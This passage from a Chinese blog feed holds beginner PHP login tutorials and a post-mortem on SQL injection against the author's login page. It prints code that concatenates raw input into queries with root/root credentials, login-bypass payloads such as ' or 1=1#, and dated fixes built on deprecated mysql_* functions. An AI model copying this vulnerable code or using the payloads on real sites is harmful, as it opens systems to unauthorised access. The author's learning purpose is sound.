type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;登录&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p><strong>index.php的源代码</strong></p><pre><code class="php">&lt;?php session_start();header(&#39;Content-type:text/html;charset=utf-8&#39;);if (isset($_SESSION[&#39;username&#39;]) &amp;&amp; $_SESSION[&#39;username&#39;]===&#39;admin&#39;) {    echo &quot;{$_SESSION[&#39;username&#39;]}您好,欢迎回来！&quot;;    echo &quot;&lt;a href=&#39;logout.php&#39;&gt;注销&lt;/a&gt;&quot;;}else {    echo &quot;&lt;a href=&#39;login.php&#39;&gt;请登录&lt;/a&gt;&quot;;}?&gt;</code></pre><p><strong>logout.php的源代码</strong></p><pre><code class="php">&lt;?php session_start();header(&#39;Content-type:text/html;charset=utf-8&#39;);if (isset($_SESSION[&#39;username&#39;]) &amp;&amp; $_SESSION[&#39;username&#39;]===&#39;admin&#39;) {    session_unset();//Free all session variables销毁变量    session_destroy();//销毁一个会话中的全部数据    setcookie(session_name(),&#39;&#39;,time()-3600,&#39;/&#39;);//销毁保存在客户端的session id    header(&#39;Location:login.html&#39;);}else{    echo &quot;&lt;script type=&#39;text/javascript&#39;&gt;alert(&#39;注销失败&#39;);location=&#39;index.php&#39;;&lt;/script&gt;&quot;;}?&gt;</code></pre><p>总结完毕，总结练习过程中收获是巨多的。一起继续努力吧！小白进阶ing</p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则表达式 </tag>
            
            <tag> 日期和时间 </tag>
            
            <tag> 图像处理 </tag>
            
            <tag> 文件与目录操作 </tag>
            
            <tag> 会话控制 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一次团队内部比赛经历</title>
      <link href="/2019/04/26/%E4%B8%80%E6%AC%A1%E5%9B%A2%E9%98%9F%E5%86%85%E9%83%A8%E6%AF%94%E8%B5%9B%E7%BB%8F%E5%8E%86/"/>
      <url>/2019/04/26/%E4%B8%80%E6%AC%A1%E5%9B%A2%E9%98%9F%E5%86%85%E9%83%A8%E6%AF%94%E8%B5%9B%E7%BB%8F%E5%8E%86/</url>
      
        <content type="html"><![CDATA[<p>经过这次登录框被多数人打爆的经历，我反思了很多。由于当时为了快点写好登录框，没有考虑对登录框的SQL注入进行预防。在写登录框制作总结时，也发现了自己登录框存在的漏洞，但是没有去改。。。最终导致这一惨剧的发生！！！</p><p>经过不断的修改，最终把我已知漏洞修复完毕。在这个过程中，我收获了很多，所以总结了一下。。</p><h3 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a>SQL注入介绍</h3><p>所谓SQL注入式攻击，就是输入域或页面请求的查询字符串，欺骗服务器执行恶意的SQL命令。在某些表单中，用户输入的内容直接用来<u>构造(或者影响)动态SQL命令</u>(也就是所谓<u>构造payload</u>)，或作为存储过程的输入参数，这类表单特别容易受到SQL注入式攻击</p><h3 id="SQL注入发生"><a href="#SQL注入发生" class="headerlink" title="SQL注入发生"></a>SQL注入发生</h3><p>当应用程序使用输入内容来构造payload以访问数据库时，会发生sql注入攻击。</p><p>如果代码使用存储过程，而这些存储过程作为包含未筛选的用户输入的 字符串来传递，也会发生sql注入。</p><p>sql注入可能导致攻击者使用应用程序登陆在数据库中执行命令。如果应用程序使用特权过高的帐户连接到数据库，这种问题会变得很严重。在某些表单中，用户输入的内容直接用来构造payload，或者作为存储过程的输入参数，这些表单特别容易受到sql注入的攻击。而许多 网站程序在编写时，没有对用户输入的合法性进行判断或者程序中本身的变量处理不当，使应用程序存在安全隐患。这样，用户就可以提交一段数据库查询的代码， 根据程序返回的结果，获得一些敏感的信息或者控制整个服务器，于是sql注入就发生了。</p><h3 id="SQL注入的预防"><a href="#SQL注入的预防" class="headerlink" title="SQL注入的预防"></a>SQL注入的预防</h3><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><p>1.永远不要信任用户的输入。对用户的输入进行校验，可以通过正则表达式，或限制长度；对单引号和双”-“进行转换等。</p><p>2.永远不要使用动态拼装sql，可以使用参数化的sql或者直接使用存储过程进行数据查询存取。</p><p>3.永远不要使用管理员权限的数据库连接，为每个应用使用单独的权限有限的数据库连接。</p><p>4.不要把机密信息直接存放，加密或者hash掉密码和敏感的信息。</p><p>5.应用的异常信息应该给出尽可能少的提示，最好使用自定义的错误信息对原始错误信息进行包装</p><p>6.sql注入的检测方法一般采取辅助软件或网站平台来检测，软件一般采用sql注入检测工具<strong>jsky</strong>,网站平台就有<strong>亿思网站安全平台</strong>检测工具</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="SQL注入漏洞"><a href="#SQL注入漏洞" class="headerlink" title="SQL注入漏洞"></a>SQL注入漏洞</h4><p>首先，先看一下我的登录验证的源代码</p><pre><code class="php">&lt;?phpheader(&#39;Content-type:text/html;charset=utf-8&#39;);$db = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;)//mysql_connect()建立数据库连接//localhost:连接MySQL地址//root:连接MySQL用户名//root:连接MySQL密码    or die(&quot;连接数据库失败！&quot;);  mysql_select_db(&quot;demo&quot;,$db)//mysql_select_db()选择数据库，这里选择的是数据库名为demo的数据库    or die(&quot;您要选择的数据库不存在&quot;.mysql_error());$username=$_POST[&#39;username&#39;];//用$username存放从login.html表单提交过来的username$password=$_POST[&#39;password&#39;];//用$password存放从login.html表单提交过来的password$sql=&quot;select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;/*用$sql存放sql查询判断命令*/$result = mysql_query($sql);//mysql_query()规定要发送的SQL查询，查询MySQL，存放于$result。注意：查询字符串不应以分号结束$colum= mysql_fetch_array($result);//mysql_fetch_array()获取和显示数据if(is_array($colum)){//is_array()检测变量是否是数组    if(setcookie(&#39;username&#39;,$_POST[&#39;username&#39;],time()+3600)){//设置cookie        header(&quot;Location:index.php&quot;);    }    else{        echo &#39;Cookie设置失败&#39;;    }}else{    echo &quot;您的用户名或密码输入有误，&lt;a href=login.html&gt;请重新登录！&lt;/a&gt;&quot;;}?&gt;</code></pre><h5 id="漏洞1"><a href="#漏洞1" class="headerlink" title="漏洞1"></a>漏洞1</h5><p><img src="http://img-blog.csdnimg.cn/20190426232543509.jpg" alt="在这里插入图片描述"></p><p>上面的这一部分应该放在另放到一个PHP文件，并把这个PHP文件重点保护。在登录验证时，可以使用require_once() 语句，在脚本执行期间包括并运行这个PHP文件。因为如果攻击者获得了登录验证的源码，就会得到数据库的用户名和密码。</p><p>当phpstudy根目录(WWW目录)下的<a href="https://baike.baidu.com/item/PhpMyAdmin/9624049?fr=aladdin" target="_blank" rel="noopener">phpMyAdmin</a>文件未删除时，攻击者会通过获得的数据库的用户名和密码，登进phpMyAdmin，查看管理员的数据库。(当然也可以考虑将phpMyAdmin文件删除，这样上面和下面的操作就可以忽略。当然，我没有删除)。</p><p><strong>注意：</strong>若没有删除phpMyAdmin文件，还需要更改一下phpMyAdmin的登录用户名和密码，这个百度、谷歌上都有<a href="https://jingyan.baidu.com/article/e4511cf332b9832b845eaf27.html" target="_blank" rel="noopener">教程</a>，可以参考一下。改好后，就可以防止直接从phpMyAdmin进入数据库啦！！</p><h5 id="漏洞2"><a href="#漏洞2" class="headerlink" title="漏洞2"></a>漏洞2</h5><p><img src="http://img-blog.csdnimg.cn/20190426232556407.jpg" alt="在这里插入图片描述"></p><p>观察上面的SQL查询命令，发现了使用动态拼装SQL语句。直接将用户提交过来的数据(用户名和密码)直接拿去执行，并没有实现进行特殊字符过滤，这是十分危险的。</p><p>当进行SQL注入攻击时，在用户名输入框中输入:<code>’ or 1=1#</code>,密码随便输入，这时候的合成后的SQL查询语句为：</p><pre><code class="php">$sql=&quot;select * from users where username=&#39;&#39; or 1=1#&#39; and password=&#39;$password&#39;&quot;;</code></pre><p><strong>分析：</strong>“#”在mysql中是注释符，这样井号后面的内容将被mysql视为注释内容，这样就不会去执行了，与以下sql语句等价：<code>select * from users where username=&#39;&#39; or 1=1</code></p><p><code>#</code>可以注释掉后面的一行SQL代码  相当于去掉了一个where条件。MySQL 注释, 过滤掉后面的SQL语句，使其不起作用。因为1=1永远是都是成立的，即where子句总是为真。</p><p><strong>应对方法：</strong></p><p><strong>方法一：</strong></p><p>对于这个语句，可以使用下面的技术对用户输入的内容进行过滤：</p><p>（1）替换单引号，即把所有单独出现的单引号改成两个单引号，防止攻击者修改SQL命令的含义。再来看这个payload语句，<code>select * from users where username=&#39;&#39;&#39; or &#39;&#39;1&#39;&#39;=&#39;&#39;1&#39; and password=&#39;&#39;&#39; or &#39;&#39;1&#39;&#39;=&#39;&#39;1&#39;</code>显然会得到与<code>select * from users where username=&#39;&#39; or &#39;1&#39;=&#39;1&#39; and password=&#39;&#39; or &#39;1&#39;=&#39;1&#39;</code>不同的结果</p><p>（2）删除用户输入内容中的所有连字符，防止攻击者构造出类如<code>select * from users where username= &#39;mas&#39; —— and password =&#39;&#39;</code>之类的查询，因为这类查询的后半部分已经被注释掉，不再有效，攻击者只要知道一个合法的用户登录名称，根本不需要知道用户的密码就可以顺利获得访问权限。</p><p>（3）对于用来执行查询的数据库帐户，限制其权限。用不同的用户帐户执行查询、插入、更新、删除操作。由于隔离了不同帐户可执行的操作，因而也就防止了原本用于执行select命令的地方却被用于执行insert、update或delete命令。</p><p><strong>方法二：</strong></p><p>先通过SQL语句查询数据库，取出相关数据</p><pre><code class="php">function collect_data(){  require_once (&quot;mysql_connect.php&quot;);  //在脚本执行期间包括并运行mysql_connect.php$sql = &quot;select * from users&quot;;  //查询数据表语句，并用变量$sql存放$result = mysql_query($sql);//执行MySQL语句，并将结果用变量$result存放$colum= mysql_fetch_array($result);//获取和显示$result的数据return $colum;//返回变量$colum的数据}</code></pre><p>然后再将用户提交过来的数据(用户名和密码)和返回的数据进行比对，成功比对才能登录成功。</p><p><strong>方法三：</strong></p><p> PHP有一个特制的功能以防止这些攻击。所有你需要做的就是使用一个函数mysql_real_escape_string()。 mysql_real_escape_string所做的是把一个输入的字符串,在MySQL查询时将它处理为用户输入的真实字符串，来防止SQL注入。就是将用户输入可能引起Mysql安全隐患的字符串比如单引号(‘)，用逃脱引用来表示\ ‘。 </p><p>将这个函数应用到上面那个可能被注入的例子中： </p><pre><code class="php">$username = mysql_real_escape_string($_POST[&#39;username&#39;]);$password= mysql_real_escape_string($_POST[&#39;password&#39;]);$sql = &quot;select*from users where username= &#39;$username&#39; and password=&#39;$password&#39;&quot;; </code></pre><p>这里要十分小心的是，mysql_real_escape_string要先成功地通过mysql_connect连接到mysql server上以后才能正常使用,如果数据库 还没连接直接使用这个函数会报错。上面经过函数转化后，$sql最后打印出来的语句为：</p><pre><code class="php">select*from users where username=&#39;$username\&#39; OR 1=1 -- and password=&#39;$password\&#39; OR 1=1 --&#39; </code></pre><p>也就是说变量$username和$password所存放的数据后面的单引号(‘)被转义为真实的输入字符，不再和$username和$password前的字符进行匹配，$username和$password前的单引号将和字符串–后面的单引号进行匹配。 </p><p>让我们创建一个通用的函数，你可以用任何名字来命名它，在这里，我要将它命名为”mres”： </p><pre><code class="php">function mres($var){    if (get_magic_quotes_gpc()){/*magic_quotes_gpc作用类似addslashes()，就是对输入的字符创中的字符进行转义处理，所有的 ‘ (单引号), ” (双引号), (反斜线) and 空字符会自动转为含有反斜线的溢出字符*/        $var = stripslashes(trim($var));//stripslashes删除由 addslashes() 函数添加的反斜杠    }    return mysql_real_escape_string(trim($var));} </code></pre><p>现在，可以把函数简化成下面这个样子：</p><pre><code class="php">$username = mres($_POST[&#39;username&#39;]);$password = mres($_POST[&#39;password&#39;]);$sql = &quot;select*from users where username= &#39;$username&#39; and password=&#39;$password&#39;&quot;; </code></pre><h5 id="漏洞3"><a href="#漏洞3" class="headerlink" title="漏洞3"></a>漏洞3</h5><p><img src="http://img-blog.csdnimg.cn/2019042623260932.jpg" alt="在这里插入图片描述"></p><p><strong>is_array()</strong> 函数用于检测变量是否是一个数组，如果检测的变量是数组，则返回 TRUE，否则返回 FALSE。</p><p>很明显当SQL语句直接在数据库执行后。没有对结果进行有无特殊字符的判断和过滤。</p><p>当然，为了配合漏洞2的第二种应对方法。这里可以进行是否全等的判断</p><pre><code class="php">if(($colum[&#39;username&#39;]===$username) &amp;&amp; ($colum[&#39;password&#39;]===$password)){     if($i==1&amp;&amp;(setcookie(&#39;username&#39;,$_POST[&#39;username&#39;],time()+3600))){        echo&quot;&lt;script type=&#39;text/javascript&#39;&gt;alert(&#39;登陆成功&#39;);location=&#39;index.php&#39;;&lt;/script&gt;&quot;;     }}</code></pre><p>这样就解决了这个问题。</p><p>漏洞貌似总结的差不多了耶！开心！！用常规SQL注入方法已经注入不进去了。但本人能力有限，若有其他漏洞，敬请大佬告知啊。本小白感激不尽！！！</p><p>小白进阶ing</p>]]></content>
      
      
      <categories>
          
          <category> 线下赛 </category>
          
          <category> 团队内部 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUG </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php mysql  html css制作带Cookie登陆页面</title>
      <link href="/2019/04/26/php%20mysql%20%20html%20css%E5%88%B6%E4%BD%9C%E5%B8%A6Cookie%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2/"/>
      <url>/2019/04/26/php%20mysql%20%20html%20css%E5%88%B6%E4%BD%9C%E5%B8%A6Cookie%E7%99%BB%E9%99%86%E9%A1%B5%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<p>这两天写了个防绕过的带Cookie登录注册页面，学习借鉴了好多知识，感觉这些知识还是需要总结总结的，总结正在登录中。。。。。</p><h3 id="1、登录-Login"><a href="#1、登录-Login" class="headerlink" title="1、登录(Login)"></a>1、登录(Login)</h3><h4 id="1-登陆页面-login-html"><a href="#1-登陆页面-login-html" class="headerlink" title="1.登陆页面(login.html)"></a>1.登陆页面(login.html)</h4><p><img src="http://img-blog.csdnimg.cn/20190801132418418.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>Login的html实现代码</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;      &lt;head&gt;          &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;          &lt;title&gt;登录页面&lt;/title&gt;         &lt;style&gt;            *{margin:0;padding:0;}/*去掉页面样式*/            .content{                position:absolute;/*绝对定位*/                top:50%;                left:0;                width:100%;                height:500px;                margin-top:-220px;                overflow:hidden;/*隐藏滚动条*/                opacity:0.6;            }            .main{                text-align:center;/*文本居中*/                max-width:600px;                height:500px;                padding:100px 0px;/*上下80px,左右为0*/                margin:0 auto;/*设置上右下左,居中显示*/                background-color:#0099ee;            }            .main h2{                font-size:70px;/*设置字体大小*/                font-weight:2px;/*调整字体粗细*/            }            form{                padding:30px 0;            }            form input{                border:1px solid block;                display:block;                margin:0px auto 10px auto;/*上 右  下 左*/                padding:10px;                width:280px;                font-size:18px;                font-weight:300px;                text-align:center;            }            form input:hover{                background-color:#0066aa;            }            .button{                background-color:#0099ff;            }            img{                width:100%;                height:100%;            }    &lt;/style&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div class=&quot;content&quot;&gt;            &lt;div class=&quot;main&quot;&gt;                &lt;h2&gt;Login&lt;/h2&gt;                &lt;form action=&quot;login_1.php&quot; method=&quot;post&quot; &gt;&lt;!--向login_1.php提交表单--&gt;                    用户名&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;username&quot; /&gt;                    密码&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;password&quot; /&gt;                    &lt;input type=&quot;submit&quot; value=&quot;立即登录&quot; class=&quot;button&quot; /&gt;                    &lt;a href=&quot;register.html&quot;&gt;用户注册&lt;/a&gt;                &lt;/form&gt;            &lt;/div&gt;        &lt;/div&gt;        &lt;img src=&quot;2.jpg&quot; /&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><h4 id="2-登录验证-login-1-php"><a href="#2-登录验证-login-1-php" class="headerlink" title="2.登录验证(login_1.php)"></a>2.登录验证(login_1.php)</h4><pre><code class="php">&lt;?phpheader(&#39;Content-type:text/html;charset=utf-8&#39;);$db = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;)//mysql_connect()建立数据库连接//localhost:连接MySQL地址//root:连接MySQL用户名//root:连接MySQL密码    or die(&quot;连接数据库失败！&quot;);  mysql_select_db(&quot;demo&quot;,$db)//mysql_select_db()选择数据库，这里选择的是数据库名为demo的数据库    or die(&quot;您要选择的数据库不存在&quot;.mysql_error());$username=$_POST[&#39;username&#39;];//用$username存放从login.html表单提交过来的username$password=$_POST[&#39;password&#39;];//用$password存放从login.html表单提交过来的password$sql=&quot;select * from users where username=&#39;$username&#39; and password=md5(&#39;$password&#39;)&quot;;/*用$sql存放sql查询判断命令，$password的数据进行md5加密*/$result = mysql_query($sql);//mysql_query()规定要发送的SQL查询，查询MySQL，存放于$result。注意：查询字符串不应以分号结束$colum= mysql_fetch_array($result);//mysql_fetch_array()获取和显示数据if(is_array($colum)){//is_array()检测变量是否是数组    if(setcookie(&#39;username&#39;,$_POST[&#39;username&#39;],time()+3600)){//设置cookie        header(&quot;Location:index.php&quot;);    }    else{        echo &#39;Cookie设置失败&#39;;    }}else{    echo &quot;您的用户名或密码输入有误，&lt;a href=login.html&gt;请重新登录！&lt;/a&gt;&quot;;}?&gt;</code></pre><h3 id="2、注册-Register-html"><a href="#2、注册-Register-html" class="headerlink" title="2、注册(Register.html)"></a>2、注册(Register.html)</h3><h4 id="1-注册页面-register-html"><a href="#1-注册页面-register-html" class="headerlink" title="1.注册页面(register.html)"></a>1.注册页面(register.html)</h4><p><img src="http://img-blog.csdnimg.cn/2019080113243235.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>register的html实现代码</p><pre><code class="html">&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;  &lt;head&gt;      &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;      &lt;title&gt;注册页面&lt;/title&gt;  &lt;/head&gt;&lt;style type=&quot;text/css&quot;&gt;      .main{          position:absolute;/*绝对定位*/        top:50%;        left:0;        width:100%;        height:800px;        margin-top:-220px;        overflow:hidden;/*隐藏滚动条*/        opacity:0.6;/*透明度*/    }    .div{        text-align:center;/*文本居中*/        max-width:600px;        height:500px;        padding:100px 0px;/*上下80px,左右为0*/        margin:0 auto;/*设置上右下左,居中显示*/        background-color:#88eeff;    }    .div h2{        font-size:70px;/*设置字体大小*/        font-weight:2px;/*调整字体粗细*/    }    form{        padding:30px 0;    }    form input{        border:1px solid block;        display:block;        margin:0px auto 10px auto;/*上 右  下 左*/        padding:10px;        width:280px;        font-size:18px;        font-weight:300px;        text-align:center;    }    form input:hover{            background-color:#005599;    }    .button{        background-color:#00ffee;    }    img{        width:100%;        height:100%;    }&lt;/style&gt;  &lt;body&gt;&lt;div class=&quot;main&quot;&gt;    &lt;div class=&quot;div&quot;&gt;        &lt;h2&gt;Register&lt;/h2&gt;         &lt;form method=&quot;post&quot; action=&quot;register_1.php&quot;&gt;   &lt;!--向register_1.php提交表单--&gt;            用户名&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt;             密码&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt;              再次输入密码：&lt;input type=&quot;password&quot; name=&quot;pwd_again&quot;&gt;            &lt;input type=&quot;submit&quot; value=&quot;注册&quot; class=&quot;button&quot;&gt;          &lt;/form&gt;    &lt;/div&gt;&lt;/div&gt;    &lt;img src=&quot;3.jpg&quot; /&gt;&lt;/body&gt;  &lt;/html&gt;</code></pre><h4 id="2-注册验证-register-1-php"><a href="#2-注册验证-register-1-php" class="headerlink" title="2.注册验证(register_1.php)"></a>2.注册验证(register_1.php)</h4><pre><code class="php">&lt;?php  //注册验证 写入数据库$db = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;)//mysql_connect()建立数据库连接//localhost:连接MySQL地址//root:连接MySQL用户名//root:连接MySQL密码    or die(&quot;连接数据库失败！&quot;);  mysql_select_db(&quot;demo&quot;,$db)//mysql_select_db()选择数据库，这里选择的是数据库名为demo的数据库    or die(&quot;您要选择的数据库不存在&quot;.mysql_error());$username=$_POST[&#39;username&#39;]; //用$username存放从register.html表单提交过来的username$password=$_POST[&#39;password&#39;]; //用$password存放从register.html表单提交过来的password$pwd_again=$_POST[&#39;pwd_again&#39;];//用$pwd_again存放从register.html表单提交过来的pwd_againif($password!=$pwd_again){     echo&quot;两次输入的密码不一致,请重新输入！&quot;;      echo&quot;&lt;a href=&#39;register.html&#39;&gt;重新输入&lt;/a&gt;&quot;;        }else{      $sql1=&quot;select * from users where username=&#39;$username&#39;&quot;;//用$sql1存放存放sql查询判断命令    $check=mysql_query($sql1);//查询MySQL，存放结果于$check    $colum= mysql_fetch_array($check);//获取和显示数据    if(is_array($colum)){        echo&quot;用户名重复，请重新注册&quot;;echo&quot;&lt;a href=&#39;register.html&#39;&gt;返回&lt;/a&gt;&quot;;    }    else{         if(($username==&#39;&#39;||$password==&#39;&#39;)){             echo&quot;注册不成功！&quot;;echo&quot;&lt;a href=&#39;register.html&#39;&gt;返回&lt;/a&gt;&quot;;          }         else{            $sql=&quot;insert into users(username,password) values(&#39;$username&#39;,&#39;$password&#39;)&quot;;/*该sql命令是，将变量$username和$password的数据，加入到表名为users且字段名为username和password的数据中。并把该命令存放变量$sql中*/            $result=mysql_query($sql);//查询MySQL，存放结果于$result            if(!$result){                echo&quot;注册不成功！&quot;;echo&quot;&lt;a href=&#39;register.html&#39;&gt;返回&lt;/a&gt;&quot;;            }            else{                echo&quot;注册成功!&quot;;echo&quot;&lt;a href=&#39;login.html&#39;&gt;请登录&lt;/a&gt;&quot;;            }        }    } }  ?&gt;</code></pre><h3 id="3、登录成功-index-php"><a href="#3、登录成功-index-php" class="headerlink" title="3、登录成功(index.php)"></a>3、登录成功(index.php)</h3><p><img src="http://img-blog.csdnimg.cn/20190801132443855.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>index的php实现代码</p><pre><code class="php+HTML">&lt;?phpheader(&#39;Content-type:text/html;charset=utf-8&#39;);if(!isset($_COOKIE[&#39;username&#39;])){//判断是否是正常登录，正常登录设置了cookie,未设置cookie即为非法登录    echo &#39;您的登录非法，请&lt;a href=&quot;login.html&quot;&gt;重新登录&lt;/a&gt;&#39;;    exit();//结束整个代码运行}?&gt;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-CN&quot;&gt;    &lt;head&gt;        &lt;meta charset=utf-8&quot; /&gt;        &lt;title&gt;欢迎登录&lt;/title&gt;        &lt;style&gt;            .show{                position:absolute;/*绝对定位*/                top:50%;                left:0;                width:100%;                height:500px;                margin-top:-220px;                overflow:hidden;/*隐藏滚动条*/                opacity:0.6;            }            .show h2{                text-align:center;/*文本居中*/                max-width:600px;                height:400px;                padding:100px 0px;/*上下80px,左右为0*/                margin:0 auto;/*设置上右下左,居中显示*/            }            img{                width:100%;                height:100%;            }        &lt;/style&gt;    &lt;/head&gt;    &lt;body&gt;        &lt;div class=&quot;show&quot;&gt;        &lt;h2&gt;Hello World!&lt;br /&gt;&lt;a href=&quot;logout.php&quot;&gt;点击注销&lt;/a&gt;&lt;/h2&gt;//跳转到logout.php，实现清除cookie操作        &lt;/div&gt;        &lt;img src=&quot;1.jpg&quot; /&gt;    &lt;/body&gt;</code></pre><h3 id="4、注销-logout-php"><a href="#4、注销-logout-php" class="headerlink" title="4、注销(logout.php)"></a>4、注销(logout.php)</h3><pre><code class="php">&lt;?phpheader(&#39;Content-type:text/html;charset=utf-8&#39;);if(isset($_COOKIE[&#39;username&#39;])){//如果设置了cookie    if(setcookie(&#39;username&#39;,$_POST[&#39;username&#39;],time()-3600)){//清除cookie，跳转到登录页面        header(&#39;Location:login.html&#39;);    }    else{        echo &#39;注销失败&#39;;        header(&#39;Location:logout.php&#39;);    }}?&gt;</code></pre><h3 id="5、数据库操作语句"><a href="#5、数据库操作语句" class="headerlink" title="5、数据库操作语句"></a>5、数据库操作语句</h3><p>写登录验证的时候，发现很多数据库的操作命令忘得差不多了，还是总结下比较好，加深加深自己的印象。。。</p><ul><li><p>创建数据库：<code>create database 数据库名称;</code></p></li><li><p>删除数据库：<code>drop database 数据库名称;</code></p></li><li><p>创建数据表：<code>create table 表名 ( id int ,username varchar(35),password varchar(40));</code></p><p>​        id username password 是字段 ,后面的限制是类型</p></li><li><p>删除数据表：<code>drop table 表名;</code></p></li><li><p><strong>选择数据库：<code>use mydata;</code></strong></p></li><li><p><strong>增记录：<code>insert into 表名(id,username,password) values(&#39;6&#39;,&#39;$username&#39;,&#39;password&#39;)；</code></strong></p><p>​        <strong>id username password 是字段,后面6、$username、$password是记录</strong></p></li><li><p><strong>删记录：<code>delete from users where id=5;</code></strong></p><p>​        <strong>删除了在表格users中id=5的那条记录，id=5即为范围</strong></p></li><li><p><strong>改记录：<code>update 表名 set 字段=‘数据’ where 范围;</code></strong></p></li><li><p><strong>查：</strong></p><p>​    <strong>查库：<code>show databases；</code></strong></p><p>​    <strong>查所有表：<code>show tables；</code></strong></p><p>​    <strong>查表：<code>select*from 表名；</code></strong></p><p>​    <strong>查字段：<code>select*from 表名 where 范围；</code></strong></p><p>​    <strong>查表结构：desc 表名；</strong></p></li></ul><h3 id="6、登录页面的漏洞"><a href="#6、登录页面的漏洞" class="headerlink" title="6、登录页面的漏洞"></a>6、登录页面的漏洞</h3><h4 id="1-or，–-，-未被过滤"><a href="#1-or，–-，-未被过滤" class="headerlink" title="1.or，–+，#未被过滤"></a>1.<code>or，–+，#</code>未被过滤</h4><p>填好正确的用户名和密码后，点击提交，将会返回给我们“Hello World!”的界面</p><p><code>select * from users where username=&#39;$username&#39; and password=md5(&#39;$password&#39;)</code></p><p>如果用户名和密码如果正确，就能够成功登陆。但是，如果输入一个错误的用户名或密码呢?很明显，肯定登入不了吧。对于有SQL注入漏洞的网站来说，只要构造个特殊的“字符串”，照样能够成功登录。</p><p>如：在用户名输入框中输入:<strong><code>’ or 1=1#</code>或<code>admin’and 1=1 #</code>或<code>admin’#</code></strong>密码随便输入，这时候的合成后的SQL查询语句为：</p><p><code>select * from users where username=&#39;&#39; or 1=1#&#39; and password=md5(&#39;&#39;)</code></p><p>语义分析：“#”在mysql中是注释符，这样#号后面的内容将被mysql视为注释内容（相当于去掉了一个where条件），这样就不会去执行，与以下sql语句等价：</p><p><code>select * from users where username=&#39;&#39; or 1=1#&#39; and password=md5(&#39;&#39;)</code></p><p><code>select * from users where username=&#39;&#39; or 1=1</code></p><p>MySQL 注释, 过滤掉后面的SQL语句，使其不起作用</p><p>因为1=1永远是都是成立的，即where子句总是为真，将该sql进一步简化之后，等价于如下select语句：</p><p><code>select * from users</code>，该sql语句的作用是检索users表中的所有字段</p><h4 id="2、or，–-，-被过滤"><a href="#2、or，–-，-被过滤" class="headerlink" title="2、or，–+，#被过滤"></a>2、<code>or，–+，#</code>被过滤</h4><p>假设后台sql查询语句为： </p><p><code>select * from users where username=’$username’ and password=’$password’</code> </p><p>构造payload(此时的我还不知payload是什么)： <strong><code>reborn’=&#39;</code></strong></p><p>这时候SQL查询语句为：</p><p><code>select * from user where username=’reborn’=” and password=’reborn’=”</code></p><p><strong>username=’reborn’返回值为0，相当于false，然后0=”的结果为1，相当于true</strong></p><p>即注入语句相当于</p><p><code>select * from user where 1 and 1</code></p><p>这是我对我这个登录页面存在的漏洞的简单总结，更多登录框SQL注入漏洞请看这位大佬的博客<a href="https://www.freebuf.com/column/150063.html" target="_blank" rel="noopener">CTF| SQL注入之login界面</a>，我觉得总结得挺详细的。。。</p><p>小白进阶ing。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 编程开发 </category>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web开发 </tag>
            
            <tag> 登录和注册功能 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF做题总结(一)</title>
      <link href="/2019/04/16/CTF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93(%E4%B8%80)/"/>
      <url>/2019/04/16/CTF%E5%81%9A%E9%A2%98%E6%80%BB%E7%BB%93(%E4%B8%80)/</url>
      
